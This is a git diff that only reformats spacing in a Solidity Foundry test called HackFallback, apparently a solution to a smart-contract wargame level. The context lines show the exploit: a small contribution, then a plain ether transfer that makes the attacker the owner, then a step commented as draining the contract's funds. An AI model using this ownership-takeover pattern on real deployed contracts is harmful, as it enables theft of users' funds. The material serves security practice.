@@ -6,7 +6,7 @@
 pragma solidity 0.8.20;
 
 import { Test, console } from "forge-std/Test.sol";
-import {Fallback} from "@src/01-Fallback/Fallback.sol";
+import { Fallback } from "@src/01-Fallback/Fallback.sol";
 
 contract HackFallback is Test {
     error HackFallback__TxFailed();
@@ -31,10 +31,10 @@ contract HackFallback is Test {
         vm.deal(attacker, 1 ether);
 
         // contribute a negligible amount of ether to set attacker contribution > 0
-        fallbackContract.contribute{value: 0.0009 ether}();
+        fallbackContract.contribute{ value: 0.0009 ether }();
 
         // send ether to the contract to set owner == attacker (msg.sender)
-        (bool success, ) = address(fallbackContract).call{value: 0.01 ether}("");
+        (bool success,) = address(fallbackContract).call{ value: 0.01 ether }("");
         if (!success) revert HackFallback__TxFailed();
 
         // drain the contract of it's funds
